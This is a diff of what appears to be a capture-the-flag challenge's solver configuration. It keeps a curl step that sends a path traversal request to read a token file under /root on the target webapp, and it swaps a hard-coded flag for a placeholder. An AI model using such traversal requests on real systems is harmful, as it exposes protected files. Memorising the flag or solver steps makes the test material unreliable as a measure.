@@ -25,10 +25,10 @@ solver:
     command: curl -s 'http://{target.webapp}/api/export?report=../../../root/token3.txt'
     expect: pwn
   - name: Assemble and verify complete flag
-    command: echo 'OCR{sc4v3ng3_p4th_pwn}'
+    command: echo '{flag}'
     expect: OCR{
 expected_flag_count: 1
-expected_flag: OCR{sc4v3ng3_p4th_pwn}
+expected_flag: '{flag}'
 forbidden_networks:
 - control-plane
 - database
